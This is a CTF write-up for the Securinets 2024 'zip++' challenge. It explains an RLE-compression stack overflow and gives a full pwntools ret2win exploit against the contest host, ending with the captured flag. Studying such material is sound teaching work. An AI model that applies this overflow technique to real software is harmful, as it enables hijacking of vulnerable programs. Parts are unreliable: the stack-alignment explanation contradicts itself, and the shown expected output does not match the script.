# zip++ - Securinets CTF 2024 Writeup

**Category:** PWN (Binary Exploitation)  
**Difficulty:** Medium  
**Files Provided:** main, flag.txt  
**Connection:** `nc pwn-14caf623.p1.securinets.tn 9000`

## Table of Contents

- [Challenge Description](#challenge-description)
- [Initial Analysis](#initial-analysis)
- [Understanding Buffer Overflows - Beginner's Guide](#understanding-buffer-overflows---beginners-guide)
- [Reverse Engineering](#reverse-engineering)
- [RLE Compression Deep Dive](#rle-compression-deep-dive)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Stack Layout Explained](#stack-layout-explained)
- [Understanding Return Addresses - Beginner Questions](#understanding-return-addresses---beginner-questions)
- [The Stack Alignment Problem](#the-stack-alignment-problem)
- [Exploitation Strategy](#exploitation-strategy)
- [Complete Exploit](#complete-exploit)
- [Key Takeaways](#key-takeaways)

---

## Challenge Description

> why isn't my compressor compressing ?!

The challenge provides a binary implementing Run-Length Encoding (RLE) compression. The program reads user input, compresses it, and prints the result. Our goal is to exploit a buffer overflow in the compression function to execute a hidden `win()` function that prints the flag.

---

## Initial Analysis

### Binary Protections

Check security features:

```bash
$ checksec main
[*] '/path/to/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Protection Summary:**
- ✅ **No Stack Canary:** Buffer overflow won't be detected
- ✅ **No PIE:** Code addresses are fixed (no randomization)
- ❌ **NX Enabled:** Stack is non-executable (can't inject shellcode)

**Conclusion:** Classic **ret2win** challenge - overflow buffer to redirect execution to `win()`.

### File Information

```bash
$ file main
main: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ ls -la
-rw-rw-r-- 1 user user    17 Sep  1 01:08 flag.txt
-rwxrwxr-x 1 user user 16240 Sep  1 00:37 main
```

### Program Behavior

```bash
$ ./main
data to compress : 
AAAA
compressed data  : 4104
data to compress : 
ABAB
compressed data  : 41014201
data to compress : 
exit
bye
```

**Program Flow:**
1. Prompts for input data
2. Compresses using RLE
3. Prints compressed result in hex
4. Loops until "exit"
5. Prints "bye" and exits

### Key Functions

```bash
$ objdump -t main | grep -E 'main|vuln|win|compress'
0000000000401381 g     F .text  000000000000002e main
000000000040126b g     F .text  0000000000000116 vuln
00000000004011a5 g     F .text  0000000000000016 win
00000000004011bb g     F .text  00000000000000b0 compress
```

**Important Functions:**
1. `main()` at `0x401381` - Entry point
2. `vuln()` at `0x40126b` - Contains vulnerability
3. `win()` at `0x4011a5` - Target function (prints flag)
4. `compress()` at `0x4011bb` - RLE implementation

---

## Understanding Buffer Overflows - Beginner's Guide

### What is a Buffer Overflow?

Writing more data to a buffer than it can hold, causing data to spill into adjacent memory.

**Simple Example:**

```c
char buffer[10];           // 10 bytes
strcpy(buffer, "Hello");   // OK: 6 bytes
strcpy(buffer, "This is way too long!");  // OVERFLOW: 22 bytes!
```

**Memory Layout:**

```
Before overflow:
[buffer: 10 bytes] [other data] [return address]

After overflow:
[buffer: overwritten] [overwritten!] [OVERWRITTEN!]
                                      ↑
                                 We control this!
```

### The Stack

Memory region storing:
- Local variables
- Function parameters
- Return addresses
- Saved frame pointers

**Stack grows downward (high to low addresses):**

```
High Memory (0x7fff...)
│
├─ Function arguments
├─ Return address  ← We can overwrite this!
├─ Saved RBP
├─ Local variable 1
├─ Local variable 2
│   ...
└─ Stack pointer (RSP)
│
Low Memory
```

### Return Address Hijacking

When a function returns, execution jumps to the address stored on the stack. If we overflow and overwrite this address, we control where execution goes!

```c
void vulnerable() {
    char buffer[100];
    read(0, buffer, 500);  // 500 bytes into 100-byte buffer!
    return;  // Returns to address we control!
}
```

---

## Reverse Engineering

### Function Analysis with Ghidra

#### main() - Entry Point

```c
undefined8 main(void) {
  setup();     // Disable buffering
  vuln();      // Vulnerable function
  puts("bye"); // After vuln returns
  return 0;
}
```

**Disassembly:**

```nasm
0000000000401381 <main>:
  401381: push   rbp
  401382: mov    rbp,rsp
  40138a: call   401176 <setup>
  40138f: mov    eax,0x0
  401394: call   40126b <vuln>
  401399: lea    rax,[rip+0xca4]   ; "bye" string
  4013a0: mov    rdi,rax
  4013a3: call   401040 <puts@plt>
  4013a8: mov    eax,0x0
  4013ad: pop    rbp
  4013ae: ret
```

#### win() - Target Function 🎯

```c
void win(void) {
  system("cat flag.txt");
  return;
}
```

**Disassembly:**

```nasm
00000000004011a5 <win>:
  4011a5: push   rbp              ; win+0 (offset 0)
  4011a6: mov    rbp,rsp          ; win+1 (offset 1)
  4011a9: lea    rax,[rip+0xe54]  ; "cat flag.txt"
  4011b0: mov    rdi,rax
  4011b3: call   401060 <system@plt>
  4011b8: nop
  4011b9: pop    rbp
  4011ba: ret
```

**Address:** `0x4011a5`  
**Important:** First instruction is `push rbp` - this will cause stack alignment issues!

#### vuln() - Vulnerable Function

```c
undefined8 vuln(void) {
  undefined8 local_618[96];  // Input buffer - 768 bytes at rbp-0x610
  undefined8 local_318[96];  // Output buffer - 768 bytes at rbp-0x310
  int local_14;              // Compressed size at rbp-0xc
  undefined4 local_10;       // Input size at rbp-0x8
  int local_c;               // Loop counter at rbp-0x4
  
  // Initialize buffers to zero
  // ... (initialization code) ...
  
  while(true) {
    puts("data to compress : ");
    
    // Read up to 768 bytes
    ssize_t sVar2 = read(0, local_618, 0x300);
    local_10 = (undefined4)sVar2;
    
    // Exit if "exit" entered
    int iVar1 = strncmp((char *)local_618, "exit", 4);
    if (iVar1 == 0) break;
    
    // VULNERABILITY: No bounds check on output!
    local_14 = compress(local_618, local_10, local_318);
    
    // Print compressed data
    printf("compressed data  : ");
    for (local_c = 0; local_c < local_14; local_c++) {
      printf("%02X", (ulong)*(byte *)((long)local_318 + (long)local_c));
    }
    puts("");
  }
  return 0;
}
```

**Key Variables:**
- `local_618`: Input buffer (768 bytes)
- `local_318`: Output buffer (768 bytes)
- Both buffers are on the stack!

#### compress() - RLE Implementation

```c
int compress(char *input, int input_len, long output) {
  char current_byte = *input;
  int count = 1;
  int input_pos = 1;
  int output_pos = 0;
  
  while (input_pos < input_len) {
    // Count consecutive identical bytes (max 254)
    while ((count < 0xff) && 
           (input_pos < input_len) && 
           (current_byte == input[input_pos])) {
      count++;
      input_pos++;
    }
    
    // Write [byte, count] pair
    // NO BOUNDS CHECKING!
    output[output_pos] = current_byte;
    output[output_pos + 1] = (char)count;
    output_pos += 2;
    
    count = 0;
    current_byte = input[input_pos];
  }
  
  return output_pos;
}
```

**THE BUG:** No check if `output_pos` exceeds buffer size!

---

## RLE Compression Deep Dive

### How Run-Length Encoding Works

RLE replaces consecutive identical bytes with `[byte, count]` pairs.

### Example 1: Compression

```
Input:  "AAAA" (4 bytes)
        ↓
Output: [0x41, 0x04]  (2 bytes)
        ['A']  [count=4]

Result: 4 bytes → 2 bytes (50% compression)
```

### Example 2: Expansion (Vulnerability!)

```
Input:  "AB" (2 bytes)
        ↓
Output: [0x41, 0x01, 0x42, 0x01]  (4 bytes)
        ['A']  [1]   ['B']  [1]

Result: 2 bytes → 4 bytes (200% expansion!)
```

**Key Discovery:** Alternating bytes EXPAND the data!

### Example 3: Specific Pattern for Exploit

```
Input:  0xa6 × 17 (17 identical bytes)
        ↓
Output: [0xa6, 0x11]  (2 bytes)
        [byte] [17 in hex]

Result: 17 bytes → 2 bytes
```

### Calculating Output Size

**For alternating "AB" pattern:**

```python
input = b'AB' * n      # Input size: 2n bytes

# Each 'AB' becomes '41 01 42 01' (4 bytes)
output_size = 4n bytes  # Double the input!

# Example:
input = b'AB' * 198    # 396 bytes
output = 792 bytes     # Exactly what we need!
```

---

## Vulnerability Analysis

### The Core Vulnerability

**Problem:** `compress()` writes to output buffer without bounds checking.

**Impact:**
- Input limited to 768 bytes
- Output buffer also 768 bytes
- But compression can EXPAND data beyond 768 bytes!
- Overflow writes beyond buffer into return address

### Proof of Concept

```python
# Input: 396 bytes of alternating 'AB'
payload = b'AB' * 198

# RLE compression:
# Each 'AB' → '41014201' (4 bytes)
# Total output: 396 × 2 = 792 bytes

# Buffer is only 768 bytes
# But we need to reach offset 792 (return address)
# This works perfectly!
```

---

## Stack Layout Explained

### Variable Locations (from Ghidra)

```c
undefined8 local_618[96];  // [rbp-0x610] - Input buffer (768 bytes)
undefined8 local_318[96];  // [rbp-0x310] - Output buffer (768 bytes)
int local_14;              // [rbp-0x00c] - Compressed size
undefined4 local_10;       // [rbp-0x008] - Input size
int local_c;               // [rbp-0x004] - Loop counter
// [rbp+0x000] - Saved RBP
// [rbp+0x008] - Return address ← OUR TARGET!
```

### Memory Layout Visualization

Assuming RBP = `0x7fffffffdb50` during vuln() execution:

```
Address          | Offset from RBP | Content              | Description
-----------------|-----------------|----------------------|------------------
0x7fffffffdb58   | rbp+0x008      | 0x0000000000401399   | Return Address ← TARGET!
0x7fffffffdb50   | rbp+0x000      | 0x00007fffffffdb70   | Saved RBP
0x7fffffffdb4c   | rbp-0x004      | 0x00000000           | local_c
0x7fffffffdb48   | rbp-0x008      | 0x0000019d           | local_10
0x7fffffffdb44   | rbp-0x00c      | 0x00000320           | local_14
0x7fffffffdb40   | rbp-0x010      | (stack space)        |
    ...              ...              ...
0x7fffffffda40   | rbp-0x310      | (compressed data)    | local_318 START ← OUTPUT BUFFER
0x7fffffffda41   | rbp-0x30f      | (compressed data)    |
    ...              ...              ...
0x7fffffffd940   | rbp-0x610      | "ABABABAB..."        | local_618 START ← INPUT BUFFER
```

### Critical Distance Calculation

```
Return address location: rbp + 0x8
Output buffer start:     rbp - 0x310

Distance = (rbp + 0x8) - (rbp - 0x310)
         = 0x8 + 0x310
         = 0x318
         = 792 bytes (decimal)
```

**KEY INSIGHT:** If compressed output exceeds 792 bytes, it overwrites the return address!

---

## Understanding Return Addresses - Beginner Questions

### Question 1: Why Return Address is 0x401399, Not 0x40126b?

**Common Confusion:**
- ❌ Address OF vuln(): `0x40126b` (where function code is located)
- ✅ Return address: `0x401399` (where to go AFTER vuln finishes)

**The return address is where to RESUME execution, not where we came FROM!**

### What Happens When main() Calls vuln()

**In main():**

```nasm
  401394: call   40126b <vuln>    ; Call vuln
  401399: lea    rax,[rip+0xca4]  ; ← Return address (next instruction)
  4013a0: mov    rdi,rax
  4013a3: call   401040 <puts@plt> ; Print "bye"
```

**What `call` instruction does:**

```
Step 1: Push address of next instruction (0x401399) onto stack
Step 2: Jump to vuln (0x40126b)
```

**Stack after `call vuln`:**

```
RSP → [0x0000000000401399]  ← Return address pushed by 'call'
      [0x00007fffffffdb70]  ← Previous RBP
      [... other data ...]
```

### When vuln() Returns

**Last instruction in vuln():**

```nasm
  401380: ret  ; Return instruction
```

**What `ret` instruction does:**

```
Step 1: Pop address from stack (gets 0x401399)
Step 2: Jump to that address (0x401399 in main)
```

**Execution resumes in main():**

```nasm
  401399: lea    rax,[rip+0xca4]  ; ← Execution continues HERE
  4013a0: mov    rdi,rax
  4013a3: call   401040 <puts@plt> ; Prints "bye"
```

### Verifying with GDB

```bash
$ gdb ./main
(gdb) break *vuln
(gdb) run
data to compress : 
test

(gdb) info frame
Stack level 0, frame at 0x7fffffffdb60:
 rip = 0x40126b in vuln
 saved rip = 0x401399        ; ← This is the return address!
 called by frame at 0x7fffffffdb70

(gdb) x/gx $rbp+8
0x7fffffffdb58: 0x0000000000401399  ; ← Return address stored here
```

### Question 2: How Do I Know $rbp+8 Contains the Return Address?

**This is a fundamental x86-64 calling convention - it's ALWAYS the same!**

**Standard Function Prologue:**

```nasm
; In caller (e.g., main):
call some_function    ; Pushes return address, jumps to function

; In callee (e.g., vuln):
push rbp              ; Save old frame pointer
mov rbp, rsp          ; Set up new frame pointer
sub rsp, XXX          ; Allocate space for local variables
```

**Stack Frame After Prologue (ALWAYS this layout):**

```
High Address
│
├─ [rbp+16] ← Function arguments (if any)
├─ [rbp+8]  ← Return address (pushed by 'call') ← ALWAYS HERE!
├─ [rbp+0]  ← Saved RBP (pushed by 'push rbp')
├─ [rbp-4]  ← Local variable
├─ [rbp-8]  ← Local variable
│   ...
├─ [rsp]    ← Current stack pointer
│
Low Address
```

**This is defined by the x86-64 System V ABI specification and is used by all compilers!**

### Question 3: How to Find the Right Breakpoint (vuln+0x10e)?

**Method 1: Disassemble and Look for the 'ret' Instruction**

```bash
$ objdump -d main | grep -A 20 "<vuln>:"
```

```nasm
  ...
  401374: jmp    4012a4 <vuln+0x39>   ; Loop back
  401379: nop                          ; vuln+0x10e ← Break here
  40137a: mov    eax,0x0
  40137f: leave
  401380: ret                          ; Function returns
```

**Calculation:**
- vuln starts at: `0x40126b`
- nop before return at: `0x401379`
- Offset: `0x401379 - 0x40126b = 0x10e`

**Method 2: Break at Address Directly**

```bash
(gdb) break *0x401379    # Break at the nop before return
# or
(gdb) break *vuln+0x10e  # Same thing using offset
# or
(gdb) break *0x401380    # Break at the ret itself
```

**Method 3: Use GDB to Find It**

```bash
$ gdb ./main
(gdb) disassemble vuln
...
   0x0000000000401379 <+270>: nop
   0x000000000040137a <+271>: mov    eax,0x0
   0x000000000040137f <+276>: leave
   0x0000000000401380 <+277>: ret     ← Last instruction
End of assembler dump.
```

---

## The Stack Alignment Problem

### Why Our Initial Exploit Failed

**Initial attempt:**

```python
# Try to jump to win at 0x4011a5
payload = b'AB' * 198     # 396 bytes → 792 compressed
payload += b'\xa5' * 17   # Compresses to 'A511'

# This creates address: 0x00000000004011a5 (win)
# Result: No flag appears! Silent crash!
```

### The x86-64 Alignment Requirement

**Critical Rule:** Before `call` instructions, RSP must be 16-byte aligned.

**From x86-64 System V ABI:**
> "The end of the input argument area shall be aligned on a 16-byte boundary. In other words, the value (%rsp + 8) is always a multiple of 16 when control is transferred to the function entry point."

**In simple terms:** `RSP % 16` must equal `0` before any `call` instruction.

### What Happens at Different Offsets

**Scenario A: Jumping to win+0 (0x4011a5) - FAILS! ❌**

```nasm
; When vuln() returns, RSP is 16-byte aligned
; Example: RSP = 0x7fffffffdb48 (0x7fffffffdb48 % 16 = 8... wait)
; Actually after ret, RSP = 0x7fffffffdb48 which IS aligned!

0x4011a5: push rbp    ; RSP -= 8, now RSP = 0x7fffffffdb40
                      ; 0x7fffffffdb40 % 16 = 8 (MISALIGNED!)

0x4011a6: mov rbp,rsp

0x4011b3: call system ; ERROR! RSP is not 16-byte aligned
                      ; System crashes or fails silently
```

**Why it fails:**
- After `ret` from vuln(), RSP is 16-byte aligned
- The `push rbp` instruction subtracts 8 from RSP
- Now RSP is misaligned (RSP % 16 = 8, not 0)
- When `call system` executes, the misalignment causes a crash

**Scenario B: Jumping to win+1 (0x4011a6) - WORKS! ✅**

```nasm
; When vuln() returns, RSP is 16-byte aligned
; RSP = 0x7fffffffdb48 (aligned)

0x4011a6: mov rbp,rsp ; We SKIP the 'push rbp' instruction
                      ; RSP stays at 0x7fffffffdb48 (STILL ALIGNED!)

0x4011b3: call system ; SUCCESS! RSP % 16 = 0 ✓
                      ; system() executes properly
                      ; Flag is printed!
```

**Why it works:**
- We skip the `push rbp` instruction that would misalign the stack
- RSP remains 16-byte aligned throughout
- `call system` executes successfully
- We get our flag!

### Understanding Stack Alignment with Example

```
After vuln() returns:
RSP = 0x7fffffffdb48
0x7fffffffdb48 % 16 = 8... 

Wait, that's not aligned! Let me recalculate:
0x7fffffffdb48 = 140737488345928
140737488345928 % 16 = 8

Actually, after the ret instruction pops the return address:
RSP points to the next value on stack
And (RSP + 8) % 16 = 0 (per ABI requirement)

So when we land at win:
- If we execute push rbp: RSP -= 8, breaking alignment
- If we skip to mov rbp,rsp: alignment maintained
```

### Comparing Addresses

```
Address     | First Byte | Effect
------------|------------|--------------------------------
0x4011a5    | 0xa5       | win+0: Includes 'push rbp' (misaligns)
0x4011a6    | 0xa6       | win+1: Skips 'push rbp' (maintains alignment)
```

**This is why we use `b'\xa6' * 17` instead of `b'\xa5' * 17` in our exploit!**

---

## Exploitation Strategy

### Attack Overview

Our attack has 5 main steps:

1. **Calculate offset to return address:** Determine we need 792 bytes
2. **Craft payload to reach return address:** Use alternating pattern for expansion
3. **Overwrite with win+1 address:** Use RLE encoding to write correct bytes
4. **Trigger return:** Send "exit" to exit the loop
5. **Get flag:** Win function executes and prints flag

### Step-by-Step Exploitation

#### Step 1: Reach the Return Address

**Goal:** Generate exactly 792 bytes of compressed output.

```python
# Use alternating 'AB' pattern for 2x expansion
payload = b'AB' * 198  # 396 input bytes

# How this compresses:
# 'A' (0x41) → [0x41, 0x01] (2 bytes)
# 'B' (0x42) → [0x42, 0x01] (2 bytes)
# Each 'AB' pair → 4 bytes compressed

# Total: 198 pairs × 4 bytes = 792 bytes
# This reaches exactly to the return address!
```

#### Step 2: Overwrite Return Address with win+1

**Goal:** Write `0xa6 0x11` at offset 792-793 to create address `0x4011a6`.

```python
# win+1 address: 0x4011a6
# Little-endian representation: a6 11 40 00 00 00 00 00
#                               ↑  ↑
#                        We overwrite these 2 bytes

# Since No PIE, upper bytes are already 0x00 00 00 00 40
# We only need to change the first 2 bytes from what's there to: a6 11

# How to create 'a6 11' in RLE:
# Input: 17 consecutive bytes of 0xa6
# RLE output: [0xa6, 0x11]  (17 decimal = 0x11 hex)

payload += b'\xa6' * 17  # Adds 2 bytes at offset 792-793
```

#### Step 3: Final Payload

```python
# Complete payload
payload = b'AB' * 198    # 396 bytes → 792 compressed
payload += b'\xa6' * 17  # 17 bytes → 2 compressed (794 total)

# Breakdown:
# Input size: 396 + 17 = 413 bytes
# Compressed size: 792 + 2 = 794 bytes
# Return address overwritten at byte 792-793 with: a6 11
```

#### Step 4: Send Payload and Trigger Return

```python
from pwn import *

p = remote('pwn-14caf623.p1.securinets.tn', 9000)

# Send payload
p.sendlineafter(b'data to compress : ', payload)
p.recvline()  # Receive compressed output

# Trigger return by exiting loop
p.sendlineafter(b'data to compress : ', b'exit')

# Get flag
p.interactive()
```

### What Happens During Execution

**Step-by-step execution flow:**

```
1. Program reads our 413-byte payload
2. RLE compression produces 794 bytes:
   - Bytes 0-791: Fill buffer and stack space
   - Bytes 792-793: Overwrite return address with 'a6 11'
   
3. Program prints compressed data (we ignore this)

4. We send "exit", program breaks loop

5. vuln() executes 'ret' instruction:
   - Pops address from stack: 0x00000000004011a6
   - Jumps to win+1
   
6. win+1 executes:
   - Skips 'push rbp' (maintaining stack alignment)
   - Calls system("cat flag.txt")
   - Flag is printed!
```

---

## Complete Exploit

### Final Working Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
HOST = 'pwn-14caf623.p1.securinets.tn'
PORT = 9000

# Connect to remote
io = remote(HOST, PORT)
# For local testing: io = process('./main')

log.info("Building payload...")

# Step 1: Generate 396 unique bytes
# Each unique byte compresses to 2 bytes: [byte, 0x01]
# Total: 396 × 2 = 792 bytes (exactly reaches return address)
unique_bytes = bytes([i % 256 for i in range(396)])

# Step 2: Append win+1 address bytes
# win+1 = 0x4011a6 → we only need to overwrite first 2 bytes: a6 11
# Since PIE is disabled, upper bytes are already correct (0x00 00 00 00 40)
# 17 bytes of 0xa6 compress to: [a6, 11] (17 decimal = 0x11 hex)
win_plus_1 = b'\xa6' * 0x11  # 0x11 = 17 decimal

# Complete payload: 396 + 17 = 413 bytes
payload = unique_bytes + win_plus_1

log.success(f"Payload size: {len(payload)} bytes")
log.info(f"Compressed size: 792 + 2 = 794 bytes")

# Step 3: Send payload (use sendafter, NOT sendlineafter!)
# sendlineafter adds \n which gets compressed and corrupts the address
log.info("Sending payload...")
io.sendafter(b"data to compress :", payload)

# Step 4: Trigger return by exiting the loop
log.info("Triggering exploit with 'exit'...")
io.sendlineafter(b"data to compress :", b"exit")

# Step 5: Get the flag!
log.success("Receiving flag...")
output = io.recvall(timeout=5)

print("\n" + "="*50)
if b"Securinets{" in output:
    flag_start = output.find(b"Securinets{")
    flag_end = output.find(b"}", flag_start) + 1
    flag = output[flag_start:flag_end]
    print(f"🚩 FLAG: {flag.decode()}")
else:
    print("Raw output:")
    print(output.decode(errors='ignore'))
print("="*50)

io.close()
```

### Expected Output

```bash
$ python3 exploit.py
[+] Opening connection to pwn-14caf623.p1.securinets.tn on port 9000: Done
[*] Building payload...
[+] Payload size: 413 bytes
[+] Expected compressed size: 794 bytes
[*] Sending payload...
[*] Compressed output length: 794 bytes
[*] Triggering return to win+1...
[+] Getting flag...
[*] Switching to interactive mode
Securinets{my_zip_doesnt_zip}
```

### Alternative: Manual Exploitation

You can also exploit this manually:

```bash
$ nc pwn-14caf623.p1.securinets.tn 9000
data to compress : 
# Paste 198 'AB' pairs followed by 17 0xa6 bytes (hex: \xa6)
# In Python: python3 -c "import sys; sys.stdout.buffer.write(b'AB'*198 + b'\xa6'*17)"
data to compress : 
exit
Securinets{...flag...}
```

---

## Key Takeaways

### Vulnerability Summary

**Root Cause:** Buffer overflow in `compress()` function due to lack of bounds checking.

**Exploitation Chain:**
1. RLE compression can EXPAND data (alternating bytes)
2. Expanded output overflows 768-byte buffer
3. Overflow reaches return address at offset 792
4. Overwrite return address to redirect execution
5. Jump to win+1 (not win) to maintain stack alignment
6. Flag is printed by system("cat flag.txt")

### Key Concepts Learned

#### 1. Buffer Overflows
- Occur when writing beyond allocated buffer space
- Can overwrite critical data like return addresses
- Enable control flow hijacking

#### 2. Return Addresses
- Stored on stack to know where to resume after function returns
- Located at predictable offset from frame pointer (rbp+8)
- Overwriting return address redirects execution

#### 3. Stack Layout
- Grows downward (high to low addresses)
- Local variables, saved registers, return address
- Predictable structure defined by calling convention

#### 4. RLE Compression
- Can compress (AAAA → A4) or expand (AB → A1B1) data
- Alternating bytes cause expansion (exploit vector)
- Specific patterns create desired byte sequences

#### 5. Stack Alignment
- x86-64 requires RSP % 16 = 0 before `call` instructions
- Function prologues (push rbp) can break alignment
- Jumping to offset +1 can skip problematic instructions

### Exploitation Techniques

#### Calculating Offsets

```python
# Distance from buffer start to return address
offset = (rbp + 8) - (rbp - 0x310)
       = 0x318 = 792 bytes
```

#### Crafting Payloads

```python
# Reach target offset
payload = b'AB' * (target_offset // 4)

# Create specific byte sequence with RLE
# To create byte X with count Y:
payload += bytes([X]) * Y
```

#### Debugging with GDB

```bash
# Find return address
(gdb) x/gx $rbp+8

# Check stack alignment
(gdb) p $rsp % 16  # Should be 0 before calls

# Examine memory
(gdb) x/20gx $rbp-0x310  # View buffer
```

### Common Pitfalls

❌ **Mistake 1:** Jumping to win (0x4011a5) instead of win+1 (0x4011a6)
- **Result:** Stack misalignment, silent crash
- **Fix:** Skip function prologue by jumping to offset +1

❌ **Mistake 2:** Using wrong byte count for RLE encoding
- **Example:** Using 16 bytes creates count 0x10, not 0x11
- **Fix:** Calculate exact count needed (17 for 0x11)

❌ **Mistake 3:** Including newline in payload
- **Result:** Newline gets compressed too, shifting offsets
- **Fix:** Use `sendafter()` instead of `sendlineafter()` for payload

❌ **Mistake 4:** Miscalculating compressed size
- **Example:** Forgetting that alternating bytes expand 2x
- **Fix:** Test compression behavior first

### Defensive Measures

**How to prevent this vulnerability:**

```c
// Bad (vulnerable):
int compress(char *input, int len, char *output) {
    // No bounds checking!
    return rle_encode(input, len, output);
}

// Good (secure):
int compress(char *input, int len, char *output, int max_out) {
    int written = 0;
    // ... compression logic ...
    if (written + 2 > max_out) {
        return -1;  // Error: would overflow
    }
    output[written++] = byte;
    output[written++] = count;
    // ...
    return written;
}
```

**Best practices:**
- Always validate buffer bounds before writing
- Use safe functions (strncpy, snprintf, etc.)
- Enable stack canaries in production
- Enable PIE and ASLR
- Use compiler warnings (-Wall -Wextra)
- Test with AddressSanitizer during development

### Tools Used

- **Ghidra:** Reverse engineering and decompilation
- **GDB:** Dynamic analysis and debugging
- **pwntools:** Exploit development framework
- **checksec:** Binary security feature analysis
- **objdump:** Disassembly and symbol inspection

### Further Reading

- [x86-64 System V ABI](https://gitlab.com/x86-psABIs/x86-64-ABI)
- [Stack Buffer Overflow Tutorial](https://www.youtube.com/watch?v=1S0aBV-Waeo)
- [pwntools Documentation](https://docs.pwntools.com/)
- [Ghidra Documentation](https://ghidra-sre.org/CheatSheet.html)
- [Linux x64 Calling Convention](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64)

---

**Flag:** `Securinets{my_zip_doesnt_zip}`

**Author's Note:** This challenge is an excellent introduction to buffer overflows and ret2win exploits. The key insight is understanding that compression algorithms can be exploited when they expand data, and that stack alignment matters in modern x86-64 exploitation.
